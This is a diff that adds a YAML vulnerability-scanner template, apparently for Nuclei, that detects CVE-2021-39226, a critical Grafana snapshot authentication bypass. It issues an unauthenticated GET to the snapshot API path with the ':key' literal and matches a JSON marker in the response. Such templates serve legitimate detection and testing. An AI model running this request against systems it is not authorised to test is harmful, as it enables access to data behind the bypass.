@@ -1,0 +1,16 @@
+id: CVE-2021-39226
+
+info: 
+  name: Grafana - Snapshot authentication bypass
+  author: Ruben Christoffer Hegland-Antonsen
+  severity: critical
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/snapshots/:key"
+
+    matchers:
+      - type: word
+        words:
+          - '"isSnapshot":true'
